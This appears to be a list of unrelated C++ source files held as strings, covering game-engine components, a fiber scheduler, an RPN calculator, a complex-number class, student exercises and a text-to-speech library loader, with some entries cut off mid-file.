    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"PerspectiveMapCaptureComponent.h\"\n#include \"PerspectiveMapFunctionLibrary.h\"\n#include \"MapActorClassifierComponent.h\"\n\n// Sets default values\nUPerspectiveMapCaptureComponent::UPerspectiveMapCaptureComponent()\n{\n\tPrimitiveRenderMode = ESceneCapturePrimitiveRenderMode::PRM_UseShowOnlyList;\n}\n\n// Called when the game starts or when spawned\nvoid UPerspectiveMapCaptureComponent::BeginPlay()\n{\n\tSuper::BeginPlay();\n\tUMapActorClassifierComponent* MapActorClassifier = UPerspectiveMapFunctionLibrary::GetMapActorClassifier(this);\n\tif(!MapActorClassifier)\n\t{\n\t\treturn;\n\t}\n\n\tMapActorClassifier->OnMapActorRegistered.AddDynamic(this, &UPerspectiveMapCaptureComponent::OnMapActorRegistered);\n\tMapActorClassifier->OnMapActorUnregistered.AddDynamic(this, &UPerspectiveMapCaptureComponent::OnMapActorUnregistered);\n\n\tTArray<FGameplayTag> CaptureTargetTags = CaptureTargetTagContainer.GetGameplayTagArray();\n\tfor(FGameplayTag CategoryTag : CaptureTargetTags)\n\t{\n\t\tFMapActorCategory ActorCategory = MapActorClassifier->GetCategoryFromTag(CategoryTag);\n\t\tfor(AActor* Actor : ActorCategory.Actors)\n\t\t{\n\t\t\tShowOnlyActors.Add(Actor);\n\t\t}\n\t}\n}\n\nvoid UPerspectiveMapCaptureComponent::OnComponentDestroyed(bool bDestroyingHierarchy)\n{\n\tSuper::OnComponentDestroyed(bDestroyingHierarchy);\n\t\n\tif(!bDestroyingHierarchy)\n\t{\n\t\tUMapActorClassifierComponent* MapActorClassifier = UPerspectiveMapFunctionLibrary::GetMapActorClassifier(this);\n\t\tif(!MapActorClassifier)\n\t\t{\n\t\t\treturn;\n\t\t}\n\n\t\tMapActorClassifier->OnMapActorRegistered.RemoveDynamic(this, &UPerspectiveMapCaptureComponent::OnMapActorRegistered);\n\t\tMapActorClassifier->OnMapActorUnregistered.RemoveDynamic(this, &UPerspectiveMapCaptureComponent::OnMapActorUnregistered);\n\t}\n}\n\n\nvoid UPerspectiveMapCaptureComponent::OnMapActorRegistered(FGameplayTag CategoryTag, AActor* Actor)\n{\n\tif(!CaptureTargetTagContainer.HasTag(CategoryTag))\n\t{\n\t\treturn;\n\t}\n\n\tShowOnlyActors.Add(Actor);\n}\n\nvoid UPerspectiveMapCaptureComponent::OnMapActorUnregistered(FGameplayTag CategoryTag, AActor* Actor)\n{\n\tif(!CaptureTargetTagContainer.HasTag(CategoryTag))\n\t{\n\t\treturn;\n\t}\n\n\tShowOnlyActors.Remove(Actor);\n}",
    "#include \"RPN.hpp\"\n\nRPN::RPN() {}\n\nRPN::RPN(const RPN& copy)\n\t: _stack(copy._stack) {}\n\nRPN::~RPN() {}\n\nRPN&\tRPN::operator=(const RPN& copy)\n{\n\t_stack = copy._stack;\n\treturn *this;\n}\n\nint\tRPN::calculateRPN(const std::string& input)\n{\n\tint\tlnum;\n\tint\trnum;\n\n\tfor (std::size_t i = 0; i < input.size(); ++i)\n\t{\n\t\tif (input[i] == ' ')\n\t\t\tcontinue ;\n\t\tif (std::isdigit(input[i]))\n\t\t{\n\t\t\t_stack.push(input[i] - '0');\n\t\t\tcontinue ;\n\t\t}\n\t\tif (input[i] != '-' && input[i] != '+' && input[i] != '*' && input[i] != '/')\n\t\t\tthrow std::runtime_error(\"Error: invalid input\");\n\t\tif (_stack.size() < 2)\n\t\t\tthrow std::runtime_error(\"Error: insufficient digit\");\n\t\trnum = _stack.top();\n\t\t_stack.pop();\n\t\tlnum = _stack.top();\n\t\t_stack.pop();\n\t\tif (input[i] == '+')\n\t\t\t_stack.push(lnum + rnum);\n\t\telse if (input[i] == '-')\n\t\t\t_stack.push(lnum - rnum);\n\t\telse if (input[i] == '*')\n\t\t\t_stack.push(lnum * rnum);\n\t\telse if (input[i] == '/')\n\t\t{\n\t\t\tif (rnum == 0)\n\t\t\t\tthrow std::runtime_error(\"Error: couldn't divide by 0\");\n\t\t\t_stack.push(lnum / rnum);\n\t\t}\n\t}\n\tif (_stack.size() == 0)\n\t\tthrow std::runtime_error(\"Error: input nothing\");\n\tif (_stack.size() != 1)\n\t\tthrow std::runtime_error(\"Error: insufficient operator\");\n\tlnum = _stack.top();\n\t_stack.pop();\n\treturn lnum;\n}",
    "#include <atomic>\n\n#include \"fiber.h\"\n#include \"./log/log.h\"\n\nint m_close_log = 0; //LOG\u7c7b\u4f7f\u7528\u53d8\u91cf\u540e\u7eed\u79fb\u9664\n\n//\u5168\u5c40\u9759\u6001\u53d8\u91cf\uff0c\u7528\u4e8e\u751f\u6210\u534f\u7a0bID\nstatic std::atomic<uint64_t> s_fiber_id{0};\n//\u5168\u5c40\u9759\u6001\u53d8\u91cf\uff0c\u7528\u4e8e\u7edf\u8ba1\u5f53\u524d\u534f\u7a0b\u6570\nstatic std::atomic<uint64_t> s_fiber_count{0};\n\n//\u7ebf\u7a0b\u5c40\u90e8\u53d8\u91cf\uff0c\u5f53\u524d\u7ebf\u7a0b\u6b63\u5728\u8fd0\u884c\u7684\u534f\u7a0b\nstatic thread_local Fiber *t_fiber = nullptr;\n//\u7ebf\u7a0b\u5c40\u90e8\u53d8\u91cf\uff0c\u5f53\u524d\u7ebf\u7a0b\u7684\u4e3b\u534f\u7a0b\u2014\u2014\u2014\u2014\u53ea\u63a5\u6536\u4e3b-\u5b50 \u4e24\u4e2a\u534f\u7a0b\u975e\u5bf9\u79f0\u7684\u5207\u6362\uff0c\u667a\u80fd\u6307\u9488\u5f62\u5f0f\nstatic thread_local Fiber::ptr t_thread_fiber = nullptr;\n\n//\u534f\u7a0b\u6808\u9ed8\u8ba4\u5927\u5c0f 128k\nstatic uint32_t fiber_stack_size = 128 * 1024;\n\n/**\n * @brief \u5c01\u88c5malloc\u548cfree\u7684\u534f\u7a0b\u6808\u5185\u5b58\u5206\u914d\u5668\n */\nclass MallocateStackAllocator {\npublic:\n    static void *Alloc(size_t size) {return malloc(size);}\n    static void Dealloc(void *vp, size_t size) {return free(vp);}\n};\n\nusing StackAllocator = MallocateStackAllocator;\n\nuint64_t Fiber::GetFiberId() {\n    //\u6ce8\u610f\u53d6\u5f97\u662f\u5f53\u524d\u6b63\u5728\u8fd0\u884c\u7684\u534f\u7a0bID\n    if (t_fiber) {\n        return t_fiber->getId();\n    }\n    return 0;\n}\n\n//\u5c06\u7ebf\u7a0b\u5f53\u524d\u8fd0\u884c\u7684\u534f\u7a0b\u8bbe\u7f6e\u6210\u53c2\u6570f\nvoid Fiber::SetThis(Fiber *f) {\n    t_fiber = f;\n}\n\nFiber::Fiber() {\n    SetThis(this); //\u5c06\u521b\u5efa\u7684\u65b0\u4e3b\u534f\u7a0b\u8bbe\u7f6e\u4e3a\u5f53\u524d\u7ebf\u7a0b\u6b63\u5728\u8fd0\u884c\u7684\n    m_state = RUNNING;\n\n    if (getcontext(&m_ctx)) {\n        //LOG_ERROR(\"%llu Fiber Main getcontext wrong\", s_fiber_id);\n    }\n\n    s_fiber_count++;\n    m_id = s_fiber_id++; //\u8fd9\u4e2a\u4e3b\u534f\u7a0b\u7684id\n\n    LOG_DEBUG(\"Fiber::Fiber main id = %llu\", m_id);\n}\n\n/**\n * @brief \u83b7\u53d6\u5f53\u524d\u534f\u7a0b\uff0c\u540c\u65f6\u5145\u5f53\u521d\u59cb\u5316\u5f53\u524d\u7ebf\u7a0b\u4e3b\u534f\u7a0b\u7684\u4f5c\u7528\n * \n * @return Fiber::ptr \u8fd4\u56de\u5f53\u524d\u7ebf\u7a0b\u7684\u534f\u7a0b\n */\nFiber::ptr Fiber::GetThis() {\n    if (t_fiber) {\n        //\u5982\u679c\u5f53\u524d\u7ebf\u7a0b\u6709\u6b63\u5728\u8fd0\u884c\u7684\u534f\u7a0b\n        return t_fiber->shared_from_this();\n    }\n    Fiber::ptr main_fiber(new Fiber); //\u7c7b\u5185\u8c03\u7528private\u7684\u6784\u9020\uff0c\u521d\u59cb\u5316\u4e3b\u534f\u7a0b\n    LOG_DEBUG(\"Judge if it's main fiber : %d\", t_fiber == main_fiber.get());\n    t_thread_fiber = main_fiber; //t_thread_fiber\u662f\u7ebf\u7a0b\u7684\u4e3b\u534f\u7a0b\uff0c\u667a\u80fd\u6307\u9488\u5f62\u5f0f\n    //\u6ce8\u610f\uff0c\u8fd9\u91cc\u4e3b\u534f\u7a0b\u7684\u521b\u5efa\u4e0d\u5206\u914d\u6808\u7a7a\u95f4\n    return t_fiber->shared_from_this();\n}\n\n/**\n * @brief \u5e26\u53c2\u6570\u7684\u6784\u9020\uff0c\u7528\u4e8e\u521b\u5efa\u5b50\u534f\u7a0b\uff0c\u9700\u8981\u5206\u914d\u8c03\u7528\u6808\u7a7a\u95f4\n * @param cb \u534f\u7a0b\u7684\u56de\u8c03\u5165\u53e3\u51fd\u6570\n * @param stacksize \u5206\u914d\u7684\u8c03\u7528\u6808\u7a7a\u95f4\u5927\u5c0f\n */\nFiber::Fiber(std::function<void()> cb, size_t stacksize) \n    : m_id(s_fiber_id++), m_cb(cb) {\n    s_fiber_count++;\n    m_stacksize = stacksize ? stacksize : fiber_stack_size;\n    m_stack = StackAllocator::Alloc(m_stacksize); //\u5206\u914d\u6808\u7a7a\u95f4\n    //\u521d\u59cb\u5316\u5e76\u62ff\u5230\u5f53\u524d\u534f\u7a0b\u4e0a\u4e0b\u6587\n    if (getcontext(&m_ctx)) {\n        //LOG_ERROR(\"%llu Fiber getcontext wrong\", s_fiber_id);\n    }\n\n    m_ctx.uc_link = nullptr;\n    m_ctx.uc_stack.ss_sp = m_stack; //\u6808\u9876\u6307\u9488\n    m_ctx.uc_stack.ss_size = m_stacksize; //\u8c03\u7528\u6808\u5927\u5c0f\n    \n    makecontext(&m_ctx, &Fiber::MainFunc, 0); //\u4fee\u6539get\u521d\u59cb\u5316\u7684context\uff0c\u8bbe\u7f6eMainFunc(\u5c01\u88c5\u540e\u7684m_cb)\u4e3acontext\u7684\u5165\u53e3\u51fd\u6570\n    //\u4e4b\u540e\u518d\u8c03\u7528swapcontext\u6216\u8005setcontext\uff0c\u7ed1\u5b9a\u7684MainFunc\u5c31\u4f1a\u88ab\u6fc0\u6d3b\n    LOG_DEBUG(\"Fiber::Fiber main id = %llu\", m_id);\n}\n\n/**\n * @brief \u56e0\u4e3a\u4e3b\u534f\u7a0b\u548c\u5b50\u534f\u7a0b\u521b\u5efa\u65b9\u5f0f\u4e0d\u540c\uff0c\u4e3b\u534f\u7a0b\u4e0d\u5206\u914d\u6808\u7a7a\u95f4\u548ccb\n * \u56e0\u6b64\uff0c\u4e3b\u3001\u5b50\u534f\u7a0b\u9700\u8981\u5206\u5f00\u5224\u65ad\u6790\u6784\n * \n */\nFiber::~Fiber() {\n    LOG_DEBUG(\"Fiber::~Fiber() id = %llu\", m_id);\n    s_fiber_count--;\n    if (m_stack) {\n        //\u5982\u679c\u5206\u914d\u4e86\u6808\u7a7a\u95f4\uff0c\u8bf4\u660e\u4e0d\u662f\u7ebf\u7a0b\u7684\u4e3b\u534f\u7a0b\uff0c\u8981\u89e3\u9664\u5206\u914d\u7684\u7a7a\u95f4\n        if (m_state != TERM) {\n            LOG_ERROR(\"Fiber::~Fiber error not TERM id = %llu\", m_id);\n        }\n        StackAllocator::Dealloc(m_stack, m_stacksize);\n        LOG_DEBUG(\"Fiber::~Fiber deallocate stack id = %llu\", m_id);\n    } else {\n        //\u6ca1\u6709\u5206\u914d\u6808\u7a7a\u95f4\uff0c\u8bf4\u660e\u662f\u7ebf\u7a0b\u7684\u4e3b\u534f\u7a0b\uff0c\u5c06\u4e3b\u534f\u7a0b\u7684\u6307\u9488\u7f6e\u7a7a\u5373\u53ef\n        //\u6ce8\u610f\uff0c\u4e00\u5b9a\u8981\u5728\u4e3b\u534f\u7a0b\u662fRUNNING\u72b6\u6001\u81ea\u5df1\u7f6e\u7a7a\n        Fiber *cur = t_fiber; //\u7ebf\u7a0b\u8fd0\u884c\u7684\u5f53\u524d\u534f\u7a0b\n        if (cur == this) {\n            //\u5982\u679c\u5f53\u524d\u534f\u7a0b\u662f\u7ebf\u7a0b\u7684\u4e3b\u534f\u7a0b\n            SetThis(nullptr);\n        }\n    }\n}\n\n\n/**\n * @brief \u53ea\u6709TERM\u72b6\u6001\u7684\u534f\u7a0b\u624d\u80fd\u91cd\u7f6e\uff0c\u91cd\u7f6e\u590d\u7528\u6808\u7a7a\u95f4\uff0c\u5c31\u4e0d\u9700\u8981\u91cd\u65b0\u5206\u914d\n * \n * @param cb \u65b0\u534f\u7a0b\u7684\u56de\u8c03\u5165\u53e3\u51fd\u6570\n */\nvoid Fiber::reset(std::function<void()> cb) {\n    if (!m_stack) LOG_ERROR(\"Fiber::reset no stack, id = %llu\", m_id);\n    if (m_state != TERM) LOG_ERROR(\"Fiber::reset fiber not TERM id = %llu\", m_id);\n    m_cb = cb; //\u62ff\u5230\u91cd\u7f6e\u7684\u56de\u8c03\uff0c\u91cd\u65b0\u6784\u5efacontext\u5373\u53ef\n    if (getcontext(&m_ctx)) {\n        //LOG_ERROR(\"%llu Fiber getcontext wrong\", s_fiber_id);\n    }\n\n    m_ctx.uc_link = nullptr;\n    m_ctx.uc_stack.ss_sp = m_stack; //\u590d\u7528\u4e0a\u4e2a\u534f\u7a0b\u7684\u6808\u7a7a\u95f4\uff0c\u56e0\u6b64\u53ea\u9700\u8981\u6539cb\n    m_ctx.uc_stack.ss_size = m_stacksize;\n\n    makecontext(&m_ctx, &Fiber::MainFunc, 0);\n    m_state = READY; //\u6539\u53d8\u72b6\u6001\n    LOG_DEBUG(\"Fiber::reset %llu is now reset\", m_id);\n}\n\n/**\n * @brief \u5207\u6362\u5230\u5f53\u524d\u534f\u7a0b\u7ee7\u7eed\u8fd0\u884c\uff0c\u6ce8\u610f\u53ea\u80fd\u4e3b-\u5b50\uff0c\u4e3b-\u5b50\u8fd9\u6837\u5207\u6362\n */\nvoid Fiber::resume() {\n    if (m_state == TERM || m_state == RUNNING) LOG_ERROR(\"Fiber::resume %llu is TERM or RUNNING, can't resume\", m_id);\n    LOG_INFO(\"Fiber %llu is now resume\", m_id);\n    SetThis(this);\n    m_state = RUNNING;\n    //swap\u4f1a\u76f4\u63a5\u8df3\u8f6c\u6267\u884c\uff0c\u5e76\u4e0d\u4f1a\u8fd4\u56de\uff0c\u76f8\u5f53\u4e8e\u8c03\u7528\u51fd\u6570\n    if (swapcontext(&(t_thread_fiber->m_ctx), &m_ctx)) {\n        LOG_ERROR(\"Fiber:: resume %llu swap false\", m_id);\n    }\n}\n\nvoid Fiber::yield() {\n    if (m_state != TERM && m_state != RUNNING) LOG_ERROR(\"Fiber::yield %llu not TERM or RUNNING, can't yield, curr state is %d\", m_id, m_state);\n    LOG_INFO(\"Fiber %llu is now yield\", m_id);\n    SetThis(t_thread_fiber.get()); //\u5f53\u524d\u534f\u7a0b\u5207\u6362\u56de\u4e3b\u534f\u7a0b\n    if (m_state != TERM) {\n        m_state = READY; //\u5982\u679c\u88ab\u5207\u6362\u6389\u7684\u534f\u7a0b\u6ca1\u6709\u7ed3\u675f\uff0c\u5219\u8f6c\u56deREADY\u7b49\u5f85\u88ab\u8c03\u5ea6\n    }\n\n    if (swapcontext(&m_ctx, &(t_thread_fiber->m_ctx))) {\n        LOG_ERROR(\"Fiber::yield %llu false\", m_id);\n    }\n}\n\nvoid Fiber::MainFunc() {\n    Fiber::ptr cur = GetThis(); //cur\u662f\u667a\u80fd\u6307\u9488\u5f62\u5f0f\n    if (!cur) {\n        LOG_ERROR(\"Fiber::MainFunc cur is nullptr\");\n    }\n    cur->m_cb(); //\u8c03\u7528\u5f53\u524d\u534f\u7a0b\u7684\u56de\u8c03\u51fd\u6570\n    cur->m_cb = nullptr;\n    cur->m_state = TERM; //\u5904\u7406\u5b8c\u6bd5\n\n    auto ra",
    "#include \"Complex.hpp\"\n\n#include <cmath>\n#include <sstream>\n\nstring to_string(const Complex &complex) {\n    return complex.to_str();\n}\n\nComplex::Complex(double real, double imag) : real(real), imag(imag) {}\n\ndouble Complex::getReal() {\n    return real;\n}\n\ndouble Complex::getImag() {\n    return imag;\n}\n\nbool Complex::operator==(const Complex &other) const {\n    return real == other.real && imag == other.imag;\n}\n\nstd::string Complex::to_str() const {\n    std::ostringstream oss;\n\n    //  the imaginary part is the only part.\n    if (real != 0 || imag == 0) {\n        oss << real;\n    }\n\n    if (imag != 0) { //  the real part is the only part.\n        if (imag > 0 && real != 0) { \n            oss << \" + \";\n        } else if (imag < 0) { \n            if (real != 0) { \n                oss << \" - \";\n            } else {\n                oss << \"-\";\n            }\n        }\n        \n        // remove the sign if the imaginary part is 1 or -1\n        if (imag != 1 && imag != -1) {\n            oss << std::abs(imag);\n        }\n\n        // and add the imaginary unit\n        oss << \"i\";\n    }\n\n    return oss.str();\n}\n\nbool Complex::operator<(const Complex &other) {\n    return sqrt(real * real + imag * imag) < sqrt(other.real * other.real + other.imag * other.imag);\n}\n\nostream &operator<<(ostream &os, const Complex &complex) {\n    os << complex.to_str();\n    return os;\n}",
    "// Copyright 2023 Google Inc. All Rights Reserved.\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n\n\n#include \"DroidshooterPlayerState.h\"\n#include \"Droidshooter.h\"\n#include \"Net/UnrealNetwork.h\"\n#include \"DroidshooterGameStateBase.h\"\n#include \"DroidshooterMainHUD.h\"\n\nADroidshooterPlayerState::ADroidshooterPlayerState() {\n\tTotalHits = 0;\n\n\t// Health\n\tMaxHealth = 25.f;\n\tHealth = MaxHealth;\n}\n\nvoid ADroidshooterPlayerState::OnRep_TotalHits() {\n\tif (ADroidshooterGameStateBase* GS = GetWorld()->GetGameState<ADroidshooterGameStateBase>()) {\n\t\tuint16 GSHits = GS->GetTotalHits();\n\t\tUE_LOG(LogDroidshooter, Log, TEXT(\"Player has TotalHits: %d/%d\"), TotalHits, GSHits);\n\n\t\tADroidshooterMainHUD* MyHUD = GetWorld()->GetFirstPlayerController()->GetHUD<ADroidshooterMainHUD>();\n\t\tif (MyHUD)\n\t\t{\n\t\t\tMyHUD->SetScore(TotalHits);\n\t\t}\n\t}\n}\n\nvoid ADroidshooterPlayerState::OnRep_Health()\n{\n\tUE_LOG(LogDroidshooter, Log, TEXT(\"Player's health is %6.4lf\"), Health);\n\n\tADroidshooterMainHUD* MyHUD = GetWorld()->GetFirstPlayerController()->GetHUD<ADroidshooterMainHUD>();\n\tif (MyHUD)\n\t{\n\t\tMyHUD->SetHealth(Health, MaxHealth);\n\t}\n}\n\n\nvoid ADroidshooterPlayerState::PlayerHit()\n{\n\tif (!HasAuthority())\n\t\treturn;\n\n\t++TotalHits;\n}\n\nvoid ADroidshooterPlayerState::UpdateHealth(float HealthDelta)\n{\n\tif (!HasAuthority())\n\t\treturn;\n\n\tHealth = FMath::Clamp(Health + HealthDelta, 0.f, MaxHealth);\n\n\tif (Health == 0.f)\n\t{\n\t\tUE_LOG(LogDroidshooter, Log, TEXT(\"Player is dead! (in DroidshooterPlayerState)\"));\n\t}\n}\n\nfloat ADroidshooterPlayerState::GetHealth() {\n\treturn Health;\n}\n\n\nvoid ADroidshooterPlayerState::GetLifetimeReplicatedProps(TArray<FLifetimeProperty>& OutLifetimeProps) const\n{\n\tSuper::GetLifetimeReplicatedProps(OutLifetimeProps);\n\tDOREPLIFETIME_CONDITION(ADroidshooterPlayerState, TotalHits, COND_OwnerOnly);\n\tDOREPLIFETIME_CONDITION(ADroidshooterPlayerState, Health, COND_OwnerOnly);\n}\n",
    "#include <iostream>\nusing namespace std;\nint main()\n{\n        string name;\n        string a;\n        int c;\n        int n;\n        int m;\n        int a1;\n        int r;\n        int b;\n        char x;\n        cout<<\"ENTER 1.(BOOKING ROOMS) 2. (CANCEL YOUR BOOKING:) 3.(NUMBER OF ROOMS AND TYPES)\";\n        cin>>m;\n        switch(m){\n        case 1:\n        cout<<\"WELCOME TO ENGINEER's HOTEL\"<<endl;\n        cout<<\"*********\"<<endl;\n        cout<<\"BOOKING ROOMS.....\"<<endl;\n        cout<<\"PLEASE ENTER YOUR NAME:\";\n        cin>>name;\n        cout<<\"ENTER YOUR AADHAR ID:\";\n        cin>>a;\n        cout<<\"ENTER YOU BOOKING ID\";\n        cin>>b;\n        cout<<\"HOW MANY NIGHT DID YOU STAY:\";\n        cin>>n;\n        cout<<\"ENTER NUMBER OF ROOMS\";\n        cin>>r;\n        cout<<endl;\n        cout<<endl;\n        cout<<\"BOOKING STATUS\"<<endl;\n        cout<<\"*************\"<<endl;\n        cout<<\"BOOKING ID:\"<<b<<endl;\n        cout<<\"NAME:\"<<name<<endl;\n        cout<<\"AADHAR ID:\"<<a<<endl;\n        cout<<\"NIGHT YOU WILL STAY:\"<<n<<endl;\n        cout<<\"NUMBER OF ROOMS\"<<r<<endl;\n        \n        cout<<\"SELECT YOUR ROOM TYPE(1.SINGLE 2.DOUBLE  3.SUIT)\";\n        cin>>c;\n        \n        switch(c){\n         case 1:\n         cout<<endl;\n         cout<<\"SINGLE ROOM\"<<endl;;\n         cout<<\"AVAIL(1 or 0)\"<<endl;\n         cin>>a1;\n         cout<<\"AVAILIBILITY ROOMS\"<<(a1 )?\" SINGLE ROOMS ARE BOOKED\":\" NOT AVAILABLE \";\n         cout<<endl;\n         \n         \n         break;\n         case 2:\n         cout<<endl;\n         cout<<\"DOUBLE ROOM\"<<endl;\n         cout<<\"AVAIL(1 0r 0)\"<<endl;\n         cin>>a1;\n         cout<<\"AVAILIBILITY ROOMS:\"<<(a1)?\" DOUBLE ROOMS ARE BOOKED\":\"NOT AVAILABLE\";\n         cout<<endl;\n         \n         break;\n         case 3:\n         cout<<endl;\n         cout<<\"SUIT ROOM \"<<endl;\n         cout<<\"AVAIL(1 or 0)\"<<endl;\n         cin>>a1;\n         cout<<\"AVAILIBILITY ROOMS\"<<(a1 )?\" SUIT ROOMS ARE  BOOKED\":\" NOT AVAILABLE\";\n         cout<<endl;\n         break;\n         default:\n         cout<<\"ROOMS ARE NOT AVAILABLE\";\n         break;\n         \n        }\n         \n         try{\n             \n         \n         if(a1==0){\n             throw x;\n         }\n         \n         \n         }\n         catch(char x){\n             cout<<\"EXCEPTION IS CAUGHT:YOUR BOOKING IS CANCEL\"<<x<<endl;\n         }\n        \n        \n    break;\n    case 2:\n    cout<<\"IF YOU WANT TO CANCEL YOUR BOOKING\"<<endl;\n    int z;\n    int x1;\n    b=12;\n    cout<<\"ENTER BOOKING ID:\";\n    cin>>z;\n    try{\n        if(b!=z ){\n            throw -1;\n        }\n        else{\n            cout<<\"YOUR BOOKING IS CANCEL\"<<endl;\n        }\n        \n    }\n    catch(int x1){\n        cout<<\"EXCEPTION IS CAUGHT:INVALID BOOKING ID \"<<endl;\n    }\n    break;\n        \n        case 3:\n        int r;\n        int a3;\n        int a2=20;\n        \n        \n        cout<<\"AVAIABLE ROOMS(1s or 2d or 3s)\"<<endl;\n        cin>>r;\n        \n        switch(r){\n            case 1:\n            \n            cout<<\"ENTER AVAIL ROOMS(1 FOR AVAIL OR ANYTHING FOR NOT AVAIL)\";\n            cin>>a3;\n            \n            if(a3==1){\n                a2=a2-3;\n                 cout<<\"SINGLE ROOMS ARE: \"<<a2<<endl;\n            }\n            else{\n                cout<<\"NOT AVAILABLE\"<<endl;\n            }\n          \n        \n            break;\n            case 2:\n            \n            \n            cout<<\"ENTER AVAIL ROOMS(1 FOR AVAIL OR ANYTHING FOR NOT AVAIL)\";\n            cin>>a3;\n            if(a3==1){\n                a2=a2-5;\n                cout<<\"DOUBLE ROOMS ARE:\"<<a2<<endl;\n            }\n            else{\n                cout<<\"NOT AVAILABLE\"<<endl;\n            }\n            \n            break;\n            case 3:\n\n        \n            cout<<\"ENTER AVAIL ROOMS(1 FOR AVAIL OR ANYTHING FOR NOT AVAIL)\";\n            cin>>a3;\n            if(a3==1){\n                a2=a2-3;\n                 cout<<\"SUIT ROOMS ARE: \"<<a2<<endl;\n            }\n            else{\n                cout<<\"NOT AVAILABLE\"<<endl;\n            }\n          \n        \n            break;\n        }\n            \n        }\n        \n        \n    return 0;\n}\n",
    "/*\r\n9. Palindrome Number\r\n\r\nGiven an integer x, return true if x is a \r\npalindrome\r\n, and false otherwise.\r\n\r\nExample 1:\r\n\r\nInput: x = 121\r\nOutput: true\r\nExplanation: 121 reads as 121 from left to right and from right to left.\r\nExample 2:\r\n\r\nInput: x = -121\r\nOutput: false\r\nExplanation: From left to right, it reads -121. From right to left, it becomes 121-. Therefore it is not a palindrome.\r\nExample 3:\r\n\r\nInput: x = 10\r\nOutput: false\r\nExplanation: Reads 01 from right to left. Therefore it is not a palindrome.\r\n \r\n\r\nConstraints:\r\n\r\n-231 <= x <= 231 - 1\r\n*/\r\n\r\n#include<iostream>\r\n#include<stdio.h>\r\n\r\nusing namespace std;\r\n\r\n// Time complexity is O(n)\r\nbool isPalindrome(int x) \r\n{\r\n    if(x<0)\r\n    {\r\n        return false;\r\n    }\r\n    long long temp=x;\r\n    long long reverse=0;\r\n\r\n    while(temp!=0)\r\n    {\r\n        // modulus collects unit place value\r\n        int digit=temp%10;\r\n        reverse=reverse*10+digit;\r\n        // division by 10 gives value without unit place\r\n        temp=temp/10;\r\n    }\r\n    \r\n   cout << \" The reverse of number is \"<<reverse<<endl;\r\n\r\n   if(x==reverse)\r\n   {\r\n    return true;\r\n   }\r\n   return false;\r\n}\r\n\r\nint main()\r\n{\r\n    //int palindrome=65056;\r\n    int palindrome=-121;\r\n    bool result = isPalindrome(palindrome);\r\n\r\n    if(result==true)\r\n    {\r\n        cout << \" The number \"<<palindrome<<\" is a palindrome\"<<endl;\r\n    }\r\n    else\r\n    {\r\n        cout << \" The number \"<<palindrome<<\" is not a palindrome\"<<endl;\r\n    }\r\n    \r\n    return 0;\r\n}",
    "/*\n * Calculator.cpp\n *\n *  Date: [Enter date]\n *  Author: [Your Name]\n */\n\n#include <iostream>\n\nusing namespace std;\n\nint main() {\n    int op1, op2;\n    char operation;\n    char answer = 'Y';\n\n    while (answer == 'Y' || answer == 'y') {\n        cout << \"Enter expression (e.g., 3 + 4): \";\n        cin >> op1 >> operation >> op2;\n\n        if (operation == '+') {\n            cout << op1 << \" + \" << op2 << \" = \" << op1 + op2 << endl;\n        } else if (operation == '-') {\n            cout << op1 << \" - \" << op2 << \" = \" << op1 - op2 << endl;\n        } else if (operation == '*') {\n            cout << op1 << \" * \" << op2 << \" = \" << op1 * op2 << endl;\n        } else if (operation == '/') {\n            if (op2 != 0) {\n                cout << op1 << \" / \" << op2 << \" = \" << op1 / op2 << endl;\n            } else {\n                cout << \"Error: Division by zero is undefined.\" << endl;\n            }\n        } else {\n            cout << \"Error: Invalid operation.\" << endl;\n        }\n\n        cout << \"Do you wish to evaluate another expression? (Y/N): \";\n        cin >> answer;\n    }\n\n    cout << \"Program Finished.\" << endl;\n    return 0;\n}",
    "\ufeff#include \"voicevox_core_host.h\"\n#include \"voicevox_core.h\"\n\nnamespace voicevox\n{\n\nclass VoicevoxCoreLibraryLoader final\n{\npublic:\n    VoicevoxCoreLibraryLoader()\n    {\n#if JUCE_WINDOWS\n        auto dll_file_to_open =\n            juce::File::getSpecialLocation(juce::File::SpecialLocationType::currentExecutableFile)\n            .getSiblingFile(\"voicevox_core.dll\");\n\n        jassert(dll_file_to_open.existsAsFile());\n\n        voicevoxCoreLibrary = std::make_unique<juce::DynamicLibrary>(dll_file_to_open.getFullPathName());\n\n        jassert(voicevoxCoreLibrary->getNativeHandle() != nullptr);\n#elif JUCE_MAC\n        auto dll_file_to_open =\n            juce::File::getSpecialLocation(juce::File::SpecialLocationType::currentExecutableFile)\n            .getSiblingFile(\"libvoicevox_core.dylib\");\n\n        jassert(dll_file_to_open.existsAsFile());\n\n        voicevoxCoreLibrary = std::make_unique<juce::DynamicLibrary>(dll_file_to_open.getFullPathName());\n\n        jassert(voicevoxCoreLibrary->getNativeHandle() != nullptr);\n#endif\n    }\n\n    ~VoicevoxCoreLibraryLoader()\n    {\n    }\n\n    bool isHandled() const\n    {\n#if JUCE_WINDOWS\n        return (voicevoxCoreLibrary->getNativeHandle() != nullptr);\n#elif JUCE_MAC\n        return (voicevoxCoreLibrary->getNativeHandle() != nullptr);\n#else\n        return true;\n#endif\n    }\n\n    juce::DynamicLibrary* getDynamicLibrary() const { return voicevoxCoreLibrary.get(); }\n\nprivate:\n\n    std::unique_ptr<juce::DynamicLibrary> voicevoxCoreLibrary;\n\n    JUCE_DECLARE_NON_COPYABLE_WITH_LEAK_DETECTOR(VoicevoxCoreLibraryLoader)\n};\n\n\n//==============================================================================\nVoicevoxCoreHost::VoicevoxCoreHost()\n    : isInitialized(false)\n{\n    jassert(sharedVoicevoxCoreLibrary->isHandled());\n\n    auto options = voicevox_make_default_initialize_options();\n\n    // NOTE: Some audio plugin host process like DAW can't handle GPU environment.\n    options.acceleration_mode = VoicevoxAccelerationMode::VOICEVOX_ACCELERATION_MODE_AUTO;\n\n    auto jtalk_dict_dir = juce::File::getSpecialLocation(juce::File::SpecialLocationType::currentExecutableFile)\n        .getParentDirectory()\n        .getChildFile(\"open_jtalk_dic_utf_8\")\n        .getFullPathName();\n    jtalk_dict_dir = jtalk_dict_dir.replace(\"\\\\\", \"/\");\n    const auto str_jtalk_dict_dir = jtalk_dict_dir.toStdString();\n    options.open_jtalk_dict_dir = 